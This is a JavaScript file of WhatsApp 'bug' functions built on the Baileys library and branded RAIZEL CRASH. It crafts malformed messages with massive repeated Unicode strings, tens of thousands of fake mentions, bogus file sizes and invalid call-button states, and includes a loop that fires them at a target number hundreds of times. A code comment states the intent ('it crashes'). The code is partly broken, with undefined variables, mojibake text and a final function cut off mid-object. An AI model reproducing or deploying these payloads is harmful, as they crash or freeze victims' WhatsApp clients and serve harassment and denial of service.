import { generateWAMessageFromContent, proto } from "@whiskeysockets/baileys";
import crypto from "crypto";

// ===================== HELPERS =====================
export const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===================== Bug Functions =====================


async function carousels2(target, fJids) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: rich.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
    gifPlayback: false,
    subtitle: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞͞⃟⏤͟͟͞͞͠🩸✦',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
            },
            footer: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );
  
  await rich.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: null } }
      : {}
  );
  console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
}

async function Loc(target, amount, jids) {
let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
locationMessage: {},
hasMediaAttachment: true
},
body: {
text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}
]
}
}
},
carouselMessage: {
cards: []
}
}
}), {
userJid: target,
quoted: null
});

await rich.relayMessage(isTarget, pesan.message, jids ? {
participant: { jid: isTarget }
} : {});
console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
}
async function thunderblast_ios1(target) {
    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await rich.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await rich.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });

await rich.relayMessage(target, {
        'extendedTextMessage': {
            'text': TravaIphone,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'UNDEFINEDONTOP↕️' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await rich.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });
    
    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@qioaje"
        }
    }, { participant: { jid: target } });
}
async function callHome(target, ptcp = true) {
let conf = {}
if (ptcp === true) {
    conf = {
        "participant": {
            "jid": target
        }
    }
}
rich.relayMessage(target, {
"viewOnceMessage": {
"message": {
"interactiveMessage": {
    "header": {
        "hasMediaAttachment": false
    },
    "body": {
        "text": "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
    },
    "nativeFlowMessage": {
        "buttons": [
            {
                "name": "cta_call",
                "buttonParamsJson": JSON.stringify({
                    "status": "𛀠"
                })
            },
// it crashes because status is not EXPIRED ore CALL_COMPLETED
            {
                "name": "call_permission_request",
                "buttonParamsJson": ""
            }
        ],
        "messageParamsJson": ""
    }
}
}
}
},conf)
}
async function CarouselX(target) {
for (let i = 0; i < 1020; i++) {
try {
        let push = [];

        // Generate 1000 cards
        for (let i = 0; i < 1020; i++) {
            push.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: ""
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            });
        }
        
        const carousel = generateWAMessageFromContent(
            targetJID, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@richieMods" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, 
            {}
        );

        await rich.relayMessage(targetJID, carousel.message, {
            participant: { jid: targetJID },
        });

    } catch (err) {
        console.error("Error in Fkod:", err);
    }
}
}

async function KingDelayMess(target, Ptcp = true) {
  await rich.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
              fileLength: 9999999999999,
              pageCount: 1316134911,
              mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
              fileName: "kingbadboi.𝐜𝐨𝐦",
              fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦\n" + "@15056662003".repeat(1000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Iqbhalkeifer",
                  url: "https://youtube.com/@iqbhalkeifer25",
                  merchant_url: "https://youtube.com/@iqbhalkeifer25"
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "{}"
              }
            ],
            messageParamsJson: "{}"
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from({ length: 50 }, () => `${Math.floor(Math.random() * 9000000000) + 1000000000}@s.whatsapp.net`)
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=", "base64"),
                fileName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
                fileEncSha256: Buffer.from("wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=", "base64"),
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1724474503,
                contactVcard: true
              }
            }
          }
        })
      }
    }
  }, Ptcp ? { participant: target } : {});
}
async function KingBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "richie is him"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await rich.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function DelayInvisNew(target) {
  const payload = {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "Qw"
    },
    message: {
      extendedTextMessage: {
        text: "\u2060", 
        matchedText: "\u2060",
        canonicalUrl: "https://t.me/DevRaizel",
        title: "𝐑𝐀𝐈𝐙𝐄𝐋",
        description: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        jpegThumbnail: "https://files.catbox.moe/aanan8.jpg",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            mediaType: 1,
            previewType: "DOCUMENT",
            title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
            thumbnailUrl: "https://files.catbox.moe/aanan8.jpg",
            sourceUrl: "https://t.me/DevRaizel"
          },
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Dimzxzzx",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/aanan8.jpg"
            }
          }
        }
      }
    }
  };

  await rich.relayMessage(target, payload.message, { messageId: payload.key.id });
}

async function superdelayinvid(target) {
  return {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "BAE538D8B0529FB7",
    },
    message: {
      extendedTextMessage: {
        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        contextInfo: {
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            extendedTextMessage: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
            },
          },
          remoteJid: "status@broadcast"
        },
      },
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    broadcast: true,
    pushName:  "2709",
  };
}
async function delayCrash(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await rich.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await rich.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "???? ???????? - ????" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}

async function alldelay(target) {
    const start = Date.now(); // Record start time

    for (let i = 0; i <= 900; i++) { 
        await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true);
     await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true);  
        await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true); 
        await KingDelayMess(target, Ptcp = true);
    }

    const end = Date.now(); // Record end time
    const seconds = ((end - start) / 1000).toFixed(2);

    console.log(`✅ alldelay finished for: ${target} in ${seconds}s`);
}
async function apaya(rich, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" + "ꦾ".repeat(120000),
                                jpegThumbnail: global.thumb,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await rich.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function bulldozer(client, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug1(rich, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "á­?".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "ðŸ©¸ ð‘Í ð¢Ì»ð³Í¢ð±Í¯ð•Ì»ðžÍœð¥Ì»ð³Í¡ ðŽÍ ðŸÌ»ðŸÍ¢ð¢ÍœðœÍ¯ð¢Ì»ðšÌ»ð¥-ðˆÍ¯ðƒ",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "ðŸŒ€" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "x!s - rizxvelz"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "ðŸŒ€ ð—¥ð—¶ð˜‡ð˜…ð˜ƒð—²ð—¹ð˜‡ - ð—§ð—¿ð—®ð˜€ð—µ ð—£ð—¿ð—¼ð˜ð—¼ð—°ð—¼ð—¹" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(rich, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "????????????????????",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
